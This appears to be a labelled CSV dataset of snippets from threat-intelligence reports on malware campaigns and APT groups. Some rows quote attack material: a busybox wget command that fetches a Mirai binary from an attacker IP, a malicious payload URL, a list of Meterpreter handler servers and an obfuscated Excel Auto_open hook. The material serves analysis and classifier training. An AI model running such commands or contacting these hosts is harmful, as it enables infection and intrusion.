ID,SPLIT,description,long_pat_train_label
338,Long_Train,"suggested the Olympic computer systems suffered technical issues during the opening ceremony. Officials at the games confirmed some technical issues to non-critical systems and they completed recovery within around 12 hours. Sunday 11th February the Olympic games officials confirmed a cyber attack occurred but did not comment or speculate further. Talos have identified the samples, with moderate confidence, used in this attack. The infection vector is currently unknown as we continue to investigate. The samples identified, however, are not from adversaries looking for information from the games but instead they are aimed to disrupt the games. The samples analysed appear to perform only destructive functionality. There does not appear to be any exfiltration of data. Analysis shows that actors are again favouring legitimate pieces of software as PsExec functionality is identified within the sample. The destructive nature of this malware aims to render the machine unusable by deleting shadow copies, event logs and trying to use PsExec & WMI to further move through the environment. This is something",0
339,Long_Train,"Blockbuster . The specific points of connection between these new samples and Operation Blockbuster include: payloads delivered by the macros discussed in Operation Blockbuster Sequel malware used by the HiddenCobra threat group malware used in the 2016 attack on the Bangladesh SWIFT banking system APK samples mimicking legitimate APKs hosted on Google Play Although Unit 42 cannot provide a full picture of the details surrounding the delivery of these samples, we are confident this activity targets Korean language speakers who use Samsung devices. Based on this evidence we believe this new malware is likely targeting South Koreans. The newly discovered samples show new capabilities not previously documented. A strong relationship between previously identified malware samples attributed to these campaigns and the newly discovered samples examined in this report. New Malware Cluster At the center of the cluster of new malware samples is a PE (ed9e373a687e42a84252c2c01046824ed699b32add73dcf3569373ac929fd3b9)",1
340,Long_Train,"targets—primarily organizations in Japan. A few weeks ago, we observed new activity from ChessMaster, with notable evolutions in terms of new tools and tactics that weren’t present in the initial attacks. From what we’ve seen, ChessMaster is continuously evolving, using open source tools and ones they developed, likely as a way to anonymize their operations. Based on the way the campaign has developed, it won’t be surprising to see additional evolutions from ChessMaster in the future. Infection Vector Figure: 1 ChessMaster infection chain. Here is a summary of how ChessMaster enters a target system: An exploit document arrives on a target system. This document abuses a SOAP WSDL parser vulnerability ( CVE-2017-8759 ) that affects the Microsoft .NET Framework",1
341,Long_Train,"a singular Linux malware trying to penetrate the network of some of our customers. The Linux malware is the well-known “ Shellbot ”, it is a crimetool belonging to the arsenal of a threat actor tracked as the “Outlaw Hacking Group. ” The Outlaw Hacking Group was first spotted by TrendMicro in 2018 when the cyber criminal crew targeted automotive and financial industries. The Outlaw Botnet uses brute force and SSH exploit (exploit Shellshock Flaw and Drupalgeddon2 vulnerability ) to achieve remote access to the target systems, including server and IoT devices. The first version spotted by TrendMicro includes a DDoS script that could be used by botmaster to set-up DDoS for-hire service offered on the dark web. The main component of this malware implant is a variant of “ Shellbot” , a Monero miner bundled with a Perl-based backdoor, which includes an IRC-based bot and an SSH scanner. Shellbot is known since 2005 and even available on GitHub. Now, Shellbot has re-appeared in the threat landscape in a recent campaign, targeting organizations worldwide with a new IRC server and new Monero pools, so we decided to deepen the analysis. Based on our findings, there are some similarities in both techniques and architectures with another cybercrime group, which appeared in the wild around 2012, most probably Romanian. Technical",1
342,Long_Train,"Blogs Corporate Executive Perspectives McAfee Labs Life at McAfee Podcast McAfee Partners All Corporate Blogs Authors Subscribe Italia 日本語 Español Français German Português All Language Blogs Mcafee / Home / Other Blogs / McAfee Labs / Ryuk Ransomware Attack Rush to Attribution Misses the Point By John Fokker and Christiaan Beek on Jan 09, 2019 Senior analyst Ryan Sherstobitoff contributed to this report. During the past week, an outbreak of Ryuk ransomware that impeded newspaper printing services in the United States has garnered a lot of attention. To determine who was behind the attack many have cited past research that compares code from Ryuk with the older ransomware",0
343,Long_Train,"new approach to malware development and delivery to the world of Sofacy. In line with this approach, we will present more on this Zebrocy innovation and activity playing out at SAS 2019 in Singapore. Our colleagues at Palo Alto recently posted an analysis of Zebrocy malware . The analysis is good and marked their first detection of a Zebrocy Go variant as October 11, 2018. Because there is much to this cluster, clarifying and adding to the discussion is always productive. Our original “Zebrocy Innovates – Layered Spearphishing Attachments and Go Downloaders” June 2018 writeup documents the very same downloader, putting the initial deployment of Zebrocy Go downloader activity at May 10, 2018. And while the targeting in the May event was most likely different from the October event, we documented this same Go downloader and same C2 was used to target a Kyrgyzstan organization. Also interesting is that the exact same system was a previous Zebrocy target earlier in 2018. So, knowing that this",0
344,Long_Train,"on a victim’s Windows system. NanoCore RAT was developed in the .Net framework, and the latest version is “1.2.2.0”. Its author, “Taylor Huddleston”, was captured by the FBI and sent to prison early last year . The sample we captured uses NanoCore to execute malicious behavior on a victim’s system. In this blog, I’ll show you how it is spread and installed onto a victim’s system. The Malicious Word Document Figure 1. The malicious Word document is opened The name of the captured Word document is “eml_-_PO20180921.doc”. When it’s opened in MS Word, we see the content shown in Figure 1. As you can see, there is a warning message in yellow on the top of the window. Once the yellow button “Enable Content” in Figure 1 is clicked by the victim, the malicious VBA code is executed in the background. The VBA",0
345,Long_Train,"program needs. Fusion Intelligence Comprehensive package that includes Operational, Cyber Crime and Cyber Espionage intelligence offerings Use understanding of full attack lifecycle to prepare your defenses against the TTPs of the threat actors of interest Strategic Intelligence Learn how to align your security resources against the most likely threats and actors Manage business and technical risks around major business decisions and security resource planning Operational Intelligence Prioritize and add context to your",0
346,Long_Train,"coronavirus pandemic as a lure, posing as an app called Coronavirus Updates. We also found similarities in two older samples disguised as a Google service and, subsequently, as a music app after further investigation. However, we have noted a significantly small number of downloads of the app in Pakistan, India, Afghanistan, Bangladesh, Iran, Saudi Arabia, Austria, Romania, Grenada, and Russia. Project Spy routine At the end of March 2020, we came across an app masquerading as a coronavirus update app, which we named Project Spy based on the login page of its backend server. Figure 1. Project Spy as an app called Corona Updates Figure 2. The Project Spy server login page.",1
347,Long_Train,Leave a Reply Cancel Reply Your email address will not be published. Required,0
348,Long_Train,"Escelar , Trojan , united states , WildFire Unit 42 for the past three months has been tracking a banking Trojan targeting victims in Brazil and the United States. Escelar originally surfaced in January of this year, and has since had roughly 100,000 instances of attempted infections. Attackers deliver the Trojan using generic Portuguese language phishing emails and are currently targeting seven Brazilian banks. Once delivered, Escelar has multiple installation stages where malware is downloaded using direct connections to multiple Microsoft SQL servers. These SQL servers are also used for command and control (C2) functionality. The most recently discovered Microsoft SQL server being used as Escalar infrastructure contained records of 1660 infections that all connected in a",0
349,Long_Train,"概述 从 2017 年底到 2019 年初，腾讯御见威胁情报中心发现一个疑似来自印度的 APT 攻击组织持续针对巴基斯坦等南亚国家的军事目标进行了定向攻击。腾讯御见威胁情报中心对该组织的攻击活动进行了长期的深入分析，从溯源结果来看，该组织的最早的攻击活动可以追溯到 2012 年。 从御见威胁情报中心的分析结果来判断，该组织的背景跟卡巴斯基在 2018 年第一季度报告中提到的 SideWinder 组织非常的相似，虽然卡巴斯基并未发布任何该组织的技术细节和报告。我们继续沿用卡巴斯基的命名，命名该组织为 "" 响尾蛇 "" （ SideWinder 、 T-APT-04 ）。 腾讯御见威胁情报中心曾在 2018 年 5 月份发布了该组织的技术分析报告，而此后腾讯御见威胁情报中心又多次捕捉到了该组织的攻击活动。并且从分析结果来看，该组织一直在更新他们的攻击技术，以此来躲避安全软件的拦截和查杀。 二、 最新样本技术分析 1、 攻击诱饵分析 本次攻击诱饵采用 CVE-2017-11882 漏洞进行攻击，打开后并无任何内容。 触发漏洞后，会从远程地址 http://cdn-do.net/includes/b7199e61/-1/7340/dfd9a1da/final 获取 hta",1
350,Long_Train,"it operates. But what if there is no time or resources to take the sample apart? This post is going to show how to examine a botnet from the Fareit family, starting with just an IP address. Then, using sandbox communities like Cisco ThreatGRID and open source products like Gephi and VirusTotal, we will track down and visualize the botnet. Talos recently discovered some activity from the Fareit trojan. This family of malware has a significant history associated with malware distribution. It is mainly an information stealer and malware downloader network which installs other malware on infected machines. In this campaign, it mainly tries to steal Firefox and other credentials. It is possible that this botnet is sold as a pay-per-infection botnet in the underground markets. Pay-per-infection is an underground business model where criminals are paying other criminals to distribute their malware. The analysis below was mainly done in July 2015. Let’s take a walk on the wild side…. AMPs behaviour based detection found suspicious executables that downloaded files by using the following URLs in one of our customer networks.",0
351,Long_Train,"media files, and other sought-after content. We detected one such campaign early this year, when The Pirate Bay (TPB) tracker filled up with harmful files used to distribute malware under the guise of cracked copies of paid programs. Malicious torrents in the TPB index We noticed that the tracker contained malicious torrents created from dozens of different accounts, including ones registered on TBP for quite some",0
352,Long_Train,attack?🤔local-update[.]com/RawabiJob.htaHTA displays a job offer and impersonates a Saudi company ( @RawabiHolding )Shares similarities with,1
353,Long_Train,"Android device. This attackmight also originate from China. We named this family Kemoge due toits command and control (CnC) domain: aps.kemoge.net. Figure 1. World Infection Map As shown in Figure 1, the infection range is wide with identifiedvictims from more than 20 countries, including governments andlarge-scale industries. This malicious adware disguises itself aspopular apps via repackaging, so it propagates widely. Some examplesare shown in Figure 2. Figure 2. Kemoge samples in the wild Figure 3. An overview of Kemoge’s lifecycle Figure 3 illustrates the lifecycle of Kemoge. The attacker uploadsthe apps to third-party app stores and promotes the download links viawebsites and in-app ads. Some aggressive ad networks gaining rootprivilege can also automatically install the samples. On the initiallaunch,",0
354,Long_Train,"To Videos Podcasts Conference Materials White Papers Threat Reports Magazine Our Experts Em Português En français En Español In Deutsch Award-winning news, views, and insight from the ESET security community Unboxing Linux/Mumblehard: Muttering spam from your servers Today, ESET researchers reveal a family of Linux malware that stayed under the radar for",0
355,Long_Train,"the repository’s web address. Learn more about clone URLs Download ZIP Metasploit Meterpreter handler servers (HTTP/HTTPS) Raw 001_readme.md This gist contains a list of verified Metasploit Meterpreter http(s) handlers and Powershell Empire http(s) listeners. Servers could be malicious, or just part of a red teaming action. Thanks to censys.io and Jose . Raw 002_meterpreter_list.csv https 18.221.129.105 443 https://18.221.129.105:443/wkqp 200 wkqp b'<html><body><h1>It works!</h1></body></html>' nginx/1.10.3 (Ubuntu) http 18.221.129.105 80 http://18.221.129.105:80/zgdr 200 zgdr b'<html><body><h1>It works!</h1></body></html>' nginx/1.10.3 (Ubuntu) http 78.40.78.118 80 http://78.40.78.118:80/xosb 200 xosb b'<html><body><h1>It works!</h1></body></html>' Apache http 208.118.68.77 80 http://208.118.68.77:80/lyya 200 lyya b'<html><body><h1>It works!</h1></body></html>' Apache https 193.238.47.173 443 https://193.238.47.173:443/xkfh 200 xkfh b'<html><body><h1>It works!</h1></body></html>' Apache http 95.174.64.99 8080 http://95.174.64.99:8080/earx 200 earx b'<html><body><h1>It works!</h1></body></html>' Apache https 178.73.220.150 443 https://178.73.220.150:443/mpfv 200 mpfv b'<html><body><h1>It works!</h1></body></html>' Apache https 58.64.167.53 443 https://58.64.167.53:443/cwsd 200 cwsd b'<html><body><h1>It works!</h1></body></html>' Apache http 85.13.245.166 8080 http://85.13.245.166:8080/laru 200 laru b'<html><body><h1>It works!</h1></body></html>' Apache https 34.242.92.127 443 https://34.242.92.127:443/dzdr 200 dzdr b'<html><body><h1>It works!</h1></body></html>' Apache https 54.85.191.51 443 https://54.85.191.51:443/wkur",0
356,Long_Train,"and Loader mechanism, but the encryption method and Bot program, as well as C2 communication protocol had been totally redesigned. For regular Mirai and their variations, normally the changes are fairly minor, changing C2s or encryption keys, or integrate some new vulnerabilities, nothing dramatic. But this one is different. Its encryption method is unique, and communication protocol is more rigorous. Also it is very likely a new branch from the Moobot group and is in active development. (the author released a third version while we work on this article, adding some new function and changing Tor C2 : vbrxmrhrjnnouvjf.onion:31337 ) So we think we should blog it and decide to name it LeetHozer because of the H0z3r string( /bin/busybox wget http://37[.49.226.171:80/bins/mirai.m68k -O - > H0z3r; ) The targets",0
357,Long_Train,"and Instagram users. The campaigns vary in complexity, resource needs and methods. Below, we outline examples of a network attack, application clones and classic phishing. It is our belief that these campaigns were used to specifically target Iranian users of the Telegram app in an effort to steal personal and login information. Once installed, some of these Telegram ""clones"" have access to mobile devices' full contact lists and messages, even if the users are also using the legitimate Telegram app. In the case of phony Instagram apps, the malicious software sends full session data back to backend servers, which allows the attacker to take full control of the account in use. We declare with high confidence that these apps should be classified as ""greyware."" It is not malicious enough to be classified as malware, but is suspicious enough to be considered a potentially unwanted program (PUP). This kind of software is difficult to detect, as it typically fulfills its functions that are expected by the user (ex. send messages). The only time this kind of software is detected by security researchers is if it has an impact somewhere else. Talos eventually discovered several pieces of software that have the potential to be used in far-reaching campaigns. We believe this greyware has the potential to reduce the privacy and security of mobile users who use these apps. Our research revealed that some of these applications send data back to a host server, or are controlled in some way from IP addresses located in Iran, even if the devices are located outside the country. Another method we saw in the Iranian attacks was the creation of fake login pages. Even though this isn't an advanced technique, it is effective against users who aren't as aware of cybersecurity as they should be. Iran-connected groups like ""Charming Kitten"" have been using this technique for a while targeting secure messaging apps. Some actors are also hijacking the device's BGP protocol. This technique redirects the traffic of all routers, without the device considering the original of those new routes. In order to hijack BGP, there needs to be some sort of cooperation from an internet service provider (ISP), and is easily detectable, so the new routes won't be in place for very long. Talos hasn't found a solid connection between the several attacks we've observed, but all of them target Iran and their nationals and the Telegram app. Although this post focuses",1
358,Long_Train,"Additionally, during the analysis of these campaigns, Talos identified a dedicated spam botnet that is currently delivering malicious spam emails as part of the infection process. Distribution campaigns While analyzing these campaigns, Talos identified two separate infection processes that we believe attackers have used between late October and early November. These campaigns used different file types for the initial download and infection process, and ultimately delivered two separate banking trojans that target Brazilian financial institutions. Both campaigns used the same naming convention for various files used during the infection process and featured the abuse of link-shortening services to obscure the actual distribution servers used. The use of link shorteners also allows some additional flexibility. Many organizations allow their employees to access link shorteners from corporate environments, which could enable the attacker to shift where they are hosting malicious files, while also enabling them to leverage these legitimate services in email-based campaigns. Campaign 1 Talos identified a spam campaign using a zipped file hosted on a free web hosting platform. This archive contains a Windows LNK file (Link). During this campaign, the filename followed the following format: ""Fatura-XXXXXXXXXX.zip,"" where ""XXXXXXXXXX"" is a 10-digit numeric value. The LNK file format was: ""__Fatura pendente -",0
359,Long_Train,"Authors CVEs EKs (Exploit Kits) Malware TDS (Traffic Distribution Systems) Archive 2015-07-08 - Exploit Integration CVE-2015-5119 (HackingTeam 0d - Flash up to 18.0.0.194) and Exploit Kits As we are all aware, a 0d (for which a patch is expected tomorrow ) was part of the files leaked from the HackingTeam",0
360,Long_Train,"insight from the ESET security community OSX/Proton spreading again through supply‑chain attack Our researchers noticed that the makers of the Elmedia Player software have been distributing a version of their app trojanized with the OSX/Proton malware. ESET Research 20 Oct 2017 - 01:56AM Share Our researchers noticed that the makers of the Elmedia Player software have been distributing a version of their app trojanized with the OSX/Proton malware. On 19 October 2017, ESET researchers noticed that Eltima , the makers of the Elmedia Player software, were distributing a version of their application trojanized with the OSX/Proton malware on their",0
361,Long_Train,"program needs. Fusion Intelligence Comprehensive package that includes Operational, Cyber Crime and Cyber Espionage intelligence offerings Use understanding of full attack lifecycle to prepare your defenses against the TTPs of the threat actors of interest Strategic Intelligence Learn how to align your security resources against the most likely threats and actors Manage business and technical risks around major business decisions and security resource planning Operational Intelligence Prioritize and add context to your",0
362,Long_Train,"are examining a novel and advanced obfuscation scheme with macrosheets embedded in the (newer) Office 2007+ format, versus the legacy OLE format (Object Linking and Embedding). Initial Samples, Low Detection Rates Tracing back through recent history, the first sample we're able to identify from this campaign appeared on VirusTotal on Monday, May 4th (Star Wars Day) : InQuest Labs: 955d59e66e24b4585dd044b1576f03ff0e6d8306397766420806979475eededd VirusTotal: 1/58 Detection rates for this and all related samples is rather abysmal, with decent coverage coming from just a single vendor, Qihoo-360, identifying the threat as Macro.office.07defname.gen . While this sample was the earliest, the first sample that caught our eye, and the primary one we'll be examining below is: 8a6e4c10c30b773147d0d7c8307d88f1cf242cb01a9747bfec0319befdc1fcaf You can download this sample to follow along yourself through our open data portal, InQuest Labs . Let's start by highlighting the ""hidden"" / ""very-hidden"" sheets and obfuscated AutoOpen hook from xl/workbook.xml : ... <sheets> <sheet name=""Sheet1"" sheetId=""1"" r:id=""rId1""/> <sheet name=""Izdxo9x56IFL1JQZhlGzFBCxVIEmmW"" sheetId=""2"" state=""veryHidden"" r:id=""rId2""/> </sheets> <definedNames> <definedName name=""_xlnm.Auto_openhFX8u"" hidden=""1"">Izdxo9x56IFL1JQZhlGzFBCxVIEmmW!$AG$4609</definedName> </definedNames> ... The Microsoft Office suite provides a large, feature-rich, backwards compatible, and ever-changing landscape for malicious actors to discover and leverage new threat tactics.",0
363,Long_Train,Cloud Security and Networking Innovator OPAQ Networks Business and Technology Fortinet Unveils Secure SD-WAN For Multi-Cloud Industry Trends Long-Term Strategies for Securing Remote Work in 2020 and Beyond Business and Technology Ushering the Era of Hyperscale Security – The New FortiGate 4400F Today,0
364,Long_Train,"taking advantage of a common command injection vulnerability . If successful, it attempts to run the script min.sh (detected by Trend Micro as Coinminer.SH.MALXMR.ATNJ) on targeted hosts. This time we spotted two variants of activities from Outlaw. The script used in the first version of its bot has two functionalities: the miner and Haiduc-based dropper. The code for the mining part also has two forms. One is in plain text bash/Perl script and the other is an obfuscated Perl script variant that avoids detection by content-inspecting intrusion prevention system (IPS)/firewalls. The second variant of the code, distributed by the bot, was mainly designed to brute force and further exploit the Microsoft Remote Desktop Protocol and cloud administration cPanel in order to escalate the privileges. This intention of further exploitation is supported by the discovery of the list of servers, which run a vulnerable library libc.so.6 with a known vulnerability . Overview of the first variant The miner downloads and starts mining for Monero cryptocurrency, using the binary that is capable of running on both Linux and Android. This variant of",0
365,Long_Train,"services, such as Tutanota and ProtonMail . In another campaign, the attackers have been targeting hundreds of Google and Yahoo accounts, successfully bypassing common forms of two-factor authentication. Introduction From the arsenal of tools and tactics used for targeted surveillance, phishing remains one of the most common and insidious form of attack affecting civil society around the world. More and more Human Rights Defenders (HRDs) have become aware of these threats. Many have taken steps to increase their resilience to such tactics. These often include using more secure, privacy-respecting email providers, or enabling two-factor authentication on their online accounts. What is phishing? Credentials phishing consists in the creation of a website that imitates the login prompt of a given online service, such as Gmail or Facebook, with the objective of luring a victim into visiting the malicious page and entering their username and passwords, thereby transmitting these credential to the attackers. Example of a phishing site imitating Facebook. However, attackers too learn and adapt in how they target HRDs. This report documents two phishing campaigns that Amnesty International believes are being carried out by the same attacker (or attackers) likely originating from amongst the Gulf countries. These broad campaigns have targeted hundreds, if not a thousand, HRDs, journalists, political actors and others in many countries throughout the Middle East and North Africa region. What makes these campaigns especially troubling is the lengths to which they go to subvert the digital security strategies of their targets. The first campaign, for example, utilizes especially well-crafted fake websites meant to imitate well-known “secure email” providers. Even more worryingly, the second demonstrates how attackers can easily defeat some forms of two-factor authentication to steal credentials, and obtain and maintain access to victims’ accounts. As a matter of fact, Amnesty Tech’s continuous monitoring and investigations into campaigns of targeted surveillance against HRDs suggest",0
366,Long_Train,"which is targeting a multinational conglomerate, and is distributed by the company’s Mobile Device Manager (MDM) server. This malware has already infected over 75% of the company’s devices. Once installed, this Cerberus variant can collect large amounts of sensitive data, including user credentials, and send it to a remote command and control (C&C) server. General: This is the first time we have a reported incident of lateral movement inside a corporate network that utilizes the MDM server as a means of spreading. Malicious actors keep upgrading their tactics and techniques, becoming more and more complex. Cisco’s TALOS has reported in the past a campaign using actor-owned MDM to control victim’s devices, and this campaign takes it to the next level – compromising a corporate-owned MDM and spreading malware to more than 75% of the corporate’s devices via the compromised MDM. This incident underscores the importance of distinguishing between managing and securing mobile devices. Managing a mobile device means installing applications, configuring settings, and applying policies on multiple devices at once. Securing a",0
367,Long_Train,Kremez,0
368,Long_Train,"The weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads. Analysis revealed a consistent first-stage payload of the well-documented Zebrocy Trojan. Additional collection of related documents revealed a second first-stage payload that we have named ‘Cannon’. Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel. Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises. The activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected. These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics. Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the two documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx . This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack. Attack Details The initial sample we intercepted was a Microsoft Word document (SHA256: 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f ) with the filename crash list(Lion Air Boeing 737).docx using the author name Joohn .",1
369,Long_Train,"Malware-as-a-Service (MaaS) Provider and Two New Threat Actors Using It QuoScient GmbH Follow Nov 29, 2018 · 3 min read Note: This article was initially written by the QuoINT Team as part of QuoScient GmbH. Since the foundation of QuoIntelligence in March 2020, this article was transferred to the QuoIntelligence website on 21 April 2020. Executive Summary Over the last few years, QuoScient’s Intelligence Operations Team",0
370,Long_Train,3 Dec 18 I can't speak to the veracity,0
371,Long_Train,"views, and insight from the ESET security community DanaBot evolves beyond banking Trojan with new spam‑sending capability ESET research shows that DanaBot operators have been expanding the malware’s scope and possibly cooperating with another criminal group ESET Research 6 Dec 2018 - 02:56PM Share ESET research shows that DanaBot operators have been expanding the malware’s scope and possibly cooperating with another criminal group DanaBot appears to have outgrown the banking Trojan category. According to our research, its operators have recently been experimenting with cunning email-address-harvesting and spam-sending features, capable of misusing webmail accounts of existing victims for further malware",0
372,Long_Train,"ESET security community Android Trojan steals money from PayPal accounts even with 2FA on ESET researchers discovered a new Android Trojan using a novel Accessibility-abusing technique that targets the official PayPal app, and is capable of bypassing PayPal’s two-factor authentication Lukas Stefanko 11 Dec 2018 - 02:57PM Share ESET researchers discovered a new Android Trojan using a novel Accessibility-abusing technique that targets the official PayPal app, and is capable of bypassing PayPal’s two-factor authentication There is a new Trojan preying on Android users, and it has some nasty tricks up its sleeve. First detected by ESET in November 2018, the malware combines the capabilities of a remotely controlled banking Trojan with a novel misuse of",0
373,Long_Train,"reported by ESET . Since we began tracking the use of Zebrocy going back to mid-2015, we have observed a significant increase in frequency of deployment of this tool. Compared to other backdoor tools associated with the Sofacy group, the use of Zebrocy in attack campaigns is far more widespread. The cluster of activity we detail in this blog revolves primarily around a common author name used in each of the delivery documents: Joohn. Our initial sample of interest was the delivery document using the crash list(Lion Air Boeing 737).docx filename, which delivered the Zebrocy tool. By leveraging our AutoFocus threat intelligence platform in conjunction with data collected from VirusTotal , we were able to pivot from artifacts discovered in the metadata and behaviors to discover the Cannon tool, as well as a number of additional delivery documents, payloads, and targets. The attack vector for all of these attacks appears to be via spear-phishing, using email accounts registered to legitimate email providers instead of spoofed email addresses or previously compromised accounts. The account names visually look similar to legitimate government organization names or other trusted third-party entities. The delivery documents were functionally all the similar, using the remote template function in Microsoft Word to retrieve a malicious macro from the first stage C2 and ultimately loading and executing an initial payload. The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document. In all, we intercepted nine weaponized documents spanning from October 17, 2018 through November 15, 2018 all sharing the same Joohn author name and delivering variants of either Zebrocy or Cannon. The target radius of our dataset spans four continents, covering",1
374,Long_Train,"containing EXE payloads The PDF and DOC/XLS campaigns primarily impacted the United States and the Archive campaigns largely impacted the Unites States and South Korea. FormBook Overview FormBook is a data stealer and form grabber that has been advertised in various hacking forums since early 2016. Figure 1 and Figure 2 show the online advertisement for the malware. Figure 1: FormBook advertisement Figure 2: FormBook underground pricing The malware injects itself into various processes and installs function hooks to log keystrokes, steal clipboard contents, and extract data from HTTP sessions. The malware can also execute commands from a command and control (C2) server. The commands include instructing the malware to download and execute files, start processes, shutdown and reboot the system, and steal cookies and local passwords. One of the malware's most interesting features is that it reads Windows’ ntdll.dll module from disk into memory, and calls its exported functions directly, rendering user-mode hooking and API monitoring mechanisms ineffective. The malware author calls this technique ""Lagos Island method"" (allegedly originating from a userland rootkit with this name). It also features a persistence method that randomly changes the path, filename, file extension, and the registry key used for persistence. The malware author does not sell the builder, but only sells the panel, and then generates the executable files",1
375,Long_Train,"Protocol), or even by using third-party software such as TeamViewer, VNC or RAdmin. We want to stress that those tools by themselves are not inherently malicious and are in most cases used for legitimate purposes, such as providing users with support or perform remote administration (hence calling this type of utilities Remote Administration Tools which can cause confusion). Some malicious actors prefer to develop their own code/tools with the hope to remain under the radar while benefiting of similar functionality. Historically, mobile banking malware was designed and used primarily to access and steal information that facilitates financial fraud. Examples of such information include second factors of authentication (SMS, mTAN) and other secrets that could be used to perform fraud through the targeted banking services. As fraud detection mechanisms used by financial institutions evolved it became harder for criminals to use aforementioned methods without being detected. Threat actors have conceived diverse ways to circumvent detection mechanisms by impersonating the victim’s device. A famous one is the use of a back-connect proxy on the infected device combined with device fingerprints, allowing the actor’s device to look like the ""real"" one. Solutions like device binding and fingerprinting allowed financials to detect such techniques, therefore criminals had to innovate again. In this situation RATs are criminals’ Holy Grail, as they offer the ability to perform fraudulent transactions directly from the infected (victim) device. By doing so, criminals are making it substantially harder to detect fraudulent transactions without a client-based detection solution. In Android banking malware, the RAT capability has not been commonly used due to limitations of the Android operating system (it requires use of the Accessibility Service). Nevertheless, back in 2016 the “Retefe” threat actors were already observed making use of RAT functionality by abusing the TeamViewer application, giving them full control over the infected device. As Retefe is run by a group of experienced Windows malware actors and because RAT capabilities are quite common in Windows banking malware, the actors probably decided to reuse that approach with Android devices as well. Threat actors motivated by financial gain have noticed the shift of consumers from desktop towards mobile based online banking. This trend has also resulted in the evolution of mobile malware in order to bypass detection measures.",1
